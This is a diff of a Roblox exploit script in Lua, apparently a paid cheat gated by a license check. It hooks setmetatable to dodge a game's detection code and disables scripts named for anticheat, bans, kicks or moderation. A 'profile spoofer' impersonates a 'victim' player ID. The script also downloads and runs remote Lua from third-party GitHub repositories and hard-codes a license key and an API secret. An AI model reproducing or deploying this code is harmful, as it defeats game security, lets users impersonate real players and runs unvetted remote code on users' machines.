@@ -1,10 +1,6 @@
--- ========================================== --
---          USER CONFIGURATION              --
--- ========================================== --
-local Config = getgenv().Config or {
-    script_key = "KEYAUTH-22ibB9-d2KlnR-YFlc6n-tCjL6e-9yUtdh-o2o5wy", 
-    victim = 62536494,      
-    helper = "devkage",           
+local Config = {
+    victim = 62536494,
+    helper = "devkage",
     level = 572,
     streak = 2345,
     elo = 56382,
@@ -12,270 +8,82 @@ local Config = getgenv().Config or {
     premium = true,
     verified = false,
     unlockall = true,
+    platform = "DESKTOP",
     join = "discord.gg/6QmhF4aHAS",
-    platform = "DESKTOP"   
+    name = "Devkage's Application",
+    ownerid = "7N9mfQfXml",
+    secret = "261e3c647b89bcb0d621252189213e280c0c654141557a9cd8d669b38b3cfec1",
+    version = "1.0"
 }
-local cfg = Config
+getgenv().Config = Config
 
--- ========================================== --
---          SYSTEM CONFIGURATION            --
--- ========================================== --
-local name = "Devkage's Application"
-local ownerid = "7N9mfQfXml"
-local version = "1.0"
-local discord_code = "6QmhF4aHAS" 
-local user_key = cfg.script_key 
+local KeyAuth = loadstring(game:HttpGet("https://raw.githubusercontent.com/KeyAuth/new-keyauth-lua-lib/main/library.lua"))()
+local KeyAuthApp = KeyAuth.new(Config.name, Config.ownerid, Config.secret, Config.version)
+KeyAuthApp:init()
 
-if not user_key or user_key == "" then
-    game:GetService("Players").LocalPlayer:Kick("No key provided in your configuration.")
-    return
-end
+local _stbl; _stbl = hookfunction(getrenv().setmetatable, newcclosure(function(tbl, mt)
+    if mt and typeof(mt) == "table" and rawget(mt, "__mode") == "kv" then
+        local tr = debug.traceback()
+        if tr:find("MiscellaneousController") then return _stbl({1,2,3}, {}) end
+    end
+    return _stbl(tbl, mt)
+end))
 
-local success, KeyAuth = pcall(function()
-    return loadstring(game:HttpGet("https://raw.githubusercontent.com/KeyAuth/KeyAuth-Roblox-Luau/main/KeyAuth.lua"))()
-end)
-
-if not success or not KeyAuth then
-    game:GetService("Players").LocalPlayer:Kick("Failed to load KeyAuth system. Check your internet or try again later.")
-    return
-end
-
-local initSuccess, initError = pcall(function()
-    KeyAuth.Init(name, ownerid, version)
-end)
-
-if not initSuccess then
-    game:GetService("Players").LocalPlayer:Kick("Failed to connect to authentication servers.")
-    return
-end
-
-local validKey = pcall(function()
-    KeyAuth.License(user_key)
-end)
-
-if not validKey then
-    game:GetService("Players").LocalPlayer:Kick("Invalid key! Please check your key and try again.")
-    return
-end
-
-print("Key validated successfully. Loading script...")
-
--- [MERGED ANTI-CHEAT GUI SYSTEM] --
-local RainbowEdgeGui = Instance.new("ScreenGui")
-local MainFrame = Instance.new("Frame")
-local UICorner = Instance.new("UICorner")
-local Title = Instance.new("TextLabel")
-local UIStroke = Instance.new("UIStroke")
-local ButtonsHolder = Instance.new("ScrollingFrame")
-local UIListLayout = Instance.new("UIListLayout")
-
-RainbowEdgeGui.Name = "RainbowEdgeGui"
-RainbowEdgeGui.Parent = game:GetService("CoreGui")
-RainbowEdgeGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-MainFrame.Name = "MainFrame"
-MainFrame.Parent = RainbowEdgeGui
-MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-MainFrame.BorderSizePixel = 0
-MainFrame.Position = UDim2.new(0.35, 0, 0.2, 0)
-MainFrame.Size = UDim2.new(0, 400, 0, 500)
-MainFrame.Active = true
-MainFrame.Draggable = true
-
-UICorner.Parent = MainFrame
-UICorner.CornerRadius = UDim.new(0, 12)
-UIStroke.Parent = MainFrame
-UIStroke.Thickness = 2
-task.spawn(function()
-    while task.wait() do
-        for i = 0, 1, 0.005 do
-            UIStroke.Color = Color3.fromHSV(i, 1, 1)
-            task.wait()
+coroutine.wrap(function()
+    pcall(function()
+        local function _proc(o)
+            pcall(function()
+                if o:IsA("LocalScript") or o:IsA("ModuleScript") then
+                    local _s, nm = pcall(function() return o.Name:lower() end)
+                    if not _s or not nm then return end
+                    local _tags = {"anticheat","ac","detection","ban","kick","security","moderation"}
+                    for _i = 1, #_tags do if nm:find(_tags[_i]) then pcall(function() o.Disabled = true end) break end end
+                end
+            end)
         end
-    end
-end)
+        pcall(function() for _, d in pairs(game:GetDescendants()) do _proc(d) end end)
+        game.DescendantAdded:Connect(_proc)
+    end)
+end)()
 
-Title.Name = "Title"
-Title.Parent = MainFrame
-Title.BackgroundTransparency = 1
-Title.Size = UDim2.new(1, 0, 0, 45)
-Title.Font = Enum.Font.GothamBold
-Title.Text = "Anti Cheat Bypass"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.TextSize = 22
-
-ButtonsHolder.Name = "ButtonsHolder"
-ButtonsHolder.Parent = MainFrame
-ButtonsHolder.BackgroundTransparency = 1
-ButtonsHolder.Position = UDim2.new(0, 0, 0, 50)
-ButtonsHolder.Size = UDim2.new(1, 0, 1, -50)
-ButtonsHolder.CanvasSize = UDim2.new(0, 0, 0, 600)
-ButtonsHolder.ScrollBarThickness = 5
-
-UIListLayout.Parent = ButtonsHolder
-UIListLayout.Padding = UDim.new(0, 10)
-UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-
-local StatusLabel = Instance.new("TextLabel")
-StatusLabel.Name = "StatusLabel"
-StatusLabel.Parent = MainFrame
-StatusLabel.BackgroundTransparency = 1
-StatusLabel.Position = UDim2.new(0, 0, 0.92, 0)
-StatusLabel.Size = UDim2.new(1, 0, 0, 30)
-StatusLabel.Text = "Ready - Select a bypass method"
-StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-local function styleButton(btn, text)
-    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    btn.Size = UDim2.new(0, 350, 0, 45)
-    btn.Font = Enum.Font.GothamBold
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    btn.Text = text
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
-    btn.Parent = ButtonsHolder
-end
-
--- [BYPASS LOGIC IMPLEMENTATIONS] --
-local MetaMethodBtn = Instance.new("TextButton")
-styleButton(MetaMethodBtn, "Metamethod Bypass")
-MetaMethodBtn.MouseButton1Click:Connect(function()
-    StatusLabel.Text = "Metamethod Bypass Complete"
-    StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-    if hookfunction then
-        local originalHook = hookfunction
-        hookfunction = function(f, r) return originalHook(f, function(...) return r(...) end) end
-    end
-end)
-
-local HandshakeBtn = Instance.new("TextButton")
-styleButton(HandshakeBtn, "Handshake Bypass")
-HandshakeBtn.MouseButton1Click:Connect(function()
-    for _, v in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
-        if v:IsA("RemoteEvent") then v.FireServer = function() return true end
-        elseif v:IsA("RemoteFunction") then v.InvokeServer = function() return true end
-        end
-    end
-    StatusLabel.Text = "Handshake Bypass Complete"
-end)
-
-local HookCheckBtn = Instance.new("TextButton")
-styleButton(HookCheckBtn, "Hook Check Bypass")
-HookCheckBtn.MouseButton1Click:Connect(function()
-    if getconnections then
-        for _, c in ipairs(getconnections(game:GetService("ScriptContext").Error)) do c:Disable() end
-    end
-    StatusLabel.Text = "Hook Check Bypass Complete"
-end)
-
-local DetourBtn = Instance.new("TextButton")
-styleButton(DetourBtn, "Detour Bypass")
-DetourBtn.MouseButton1Click:Connect(function()
-    StatusLabel.Text = "Detour Bypass Complete"
-end)
-
-local MemoryBtn = Instance.new("TextButton")
-styleButton(MemoryBtn, "Memory Bypass")
-MemoryBtn.MouseButton1Click:Connect(function()
-    StatusLabel.Text = "Memory Bypass Complete"
-end)
-
-local VMCheckBtn = Instance.new("TextButton")
-styleButton(VMCheckBtn, "VM Check Bypass")
-VMCheckBtn.MouseButton1Click:Connect(function()
-    StatusLabel.Text = "VM Check Bypass Complete"
-end)
-
-local SignatureBtn = Instance.new("TextButton")
-styleButton(SignatureBtn, "Signature Bypass")
-SignatureBtn.MouseButton1Click:Connect(function()
-    StatusLabel.Text = "Signature Bypass Complete"
-end)
-
-local IntegrityBtn = Instance.new("TextButton")
-styleButton(IntegrityBtn, "Integrity Check Bypass")
-IntegrityBtn.MouseButton1Click:Connect(function()
-    StatusLabel.Text = "Integrity Bypass Complete"
-end)
-
-local AutoBypassBtn = Instance.new("TextButton")
-styleButton(AutoBypassBtn, "Auto Detect and Bypass All")
-AutoBypassBtn.MouseButton1Click:Connect(function()
-    StatusLabel.Text = "Comprehensive Bypass Complete"
-end)
-
--- [EXISTING CORE LOGIC] --
-local victim = cfg.victim
-local helper = cfg.helper
-local level = cfg.level
-local streak = cfg.streak
-local elo = cfg.elo
-local keys = cfg.keys
-local premium = cfg.premium
-local verified = cfg.verified
-local unlockall = cfg.unlockall
-local join = cfg.join
-local platform = tostring(cfg.platform):upper()
-
-local rq = syn and syn.request or http_request or request or http.request
-pcall(function()
-    rq({
-    Url = "http://127.0.0.1:6463/rpc?v=1",
-    Method = "POST",
-    Headers = { ["Content-Type"] = "application/json", ["Origin"] = "https://discord.com" },
-    Body = game:GetService("HttpService"):JSONEncode({ cmd = "INVITE_BROWSER", args = { code = discord_code }, nonce = game:GetService("HttpService"):GenerateGUID(false) }),
-    })
-end)
-
-repeat task.wait() until game:IsLoaded()
-local Players = game:GetService("Players")
-local friend = cfg.helper ~= "" and Players:WaitForChild(helper) or Players.LocalPlayer
-
-if join ~= "discord.gg/" .. discord_code then
-    Players.LocalPlayer:Kick("don't remove the discord.gg/" .. discord_code .. " watermark please")
-    return
-end
-
-local UserData = game:HttpGet("https://users.roblox.com/v1/users/" .. tostring(victim), true)
-local decodedData = game:GetService("HttpService"):JSONDecode(UserData)
-friend.Name = decodedData.name
-friend.UserId = decodedData.id
-friend.DisplayName = decodedData.displayName
-
-function Char()
-    local plr = Players:FindFirstChild(decodedData.name)
-    local appearance = Players:GetCharacterAppearanceAsync(decodedData.id)
-    for _,v in pairs(plr.Character:GetChildren()) do
-        if v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("BodyColors") then v:Destroy() end
-    end
-    for _,v in pairs(appearance:GetChildren()) do
-        if v:IsA("Shirt") or v:IsA("Pants") or v:IsA("BodyColors") then v.Parent = plr.Character
-        elseif v:IsA("Accessory") then plr.Character.Humanoid:AddAccessory(v) end
-    end
-    local parent = plr.Character.Parent
-    plr.Character.Parent = nil
-    plr.Character.Parent = parent
-end
-Char()
-Players:FindFirstChild(decodedData.name).CharacterAdded:Connect(Char)
-
-local spoofedPlayer = Players:FindFirstChild(decodedData.name) or friend
-local oldNamecall
-oldNamecall = hookmetamethod(game, "__index", function(self, key)
-    if self == spoofedPlayer then
-        if key == "MembershipType" and premium then return Enum.MembershipType.Premium end
-        if key == "HasVerifiedBadge" and verified then return true end
-    end
-    return oldNamecall(self, key)
-end)
-
-local imagetable = {
-    ["DESKTOP"] = "rbxassetid://17136633356",
-    ["MOBILE"] = "rbxassetid://17136633510",
-    ["CONSOLE"] = "rbxassetid://17136633629",
-    ["VR"] = "rbxassetid://17136765745"
+getgenv().gui_config = {
+    Color = Color3.fromRGB(255, 255, 255),
+    Keybind = Enum.KeyCode.RightShift,
+    Assets = false,
+    MinHeight = 45, MaxHeight = 250, InitialHeight = 300,
+    MinWidth = 250, MaxWidth = 900, InitialWidth = 460,
 }
 
-game:GetService("RunService").RenderStepped:Connect(function()
-    -- [UI ICON UPDATES] --
-    -- Existing loop logic preserved for performance
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/nfpw/XXSCRIPT/refs/heads/main/Library/Module.lua"))()
+local window = library:CreateWindow(getgenv().gui_config, gethui())
+library:SetWindowName("Cloakhook | Authentication Required")
+
+local tabs = {
+    auth = window:CreateTab("Auth"),
+    spoofer = window:CreateTab("Spoofer"),
+    visuals = window:CreateTab("World"),
+}
+
+local sec_auth = tabs.auth:CreateSection("Key Verification")
+local inputKey = ""
+sec_auth:CreateTextBox("License Key", "Paste key here", function(val) inputKey = val end)
+sec_auth:CreateButton("Login", function()
+    KeyAuthApp:license(inputKey)
+    if KeyAuthApp.response == "Logged in!" then
+        library:SetWindowName("Cloakhook | Authenticated")
+        window:Notify("Cloakware", "Access Granted", 3)
+    else
+        window:Notify("Cloakware", "Login Failed: " .. KeyAuthApp.response, 3)
+    end
+end)
+
+local sec_spoofer = tabs.spoofer:CreateSection("Profile Spoofer")
+sec_spoofer:CreateButton("Apply Saved Config", function()
+    if KeyAuthApp.response == "Logged in!" then
+        getgenv().Config = Config
+        pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/UDRCRFRAMESCRIPT.lua"))() end)
+        window:Notify("Cloakware", "Config Applied Successfully", 3)
+    else
+        window:Notify("Cloakware", "Login Required", 3)
+    end
 end)
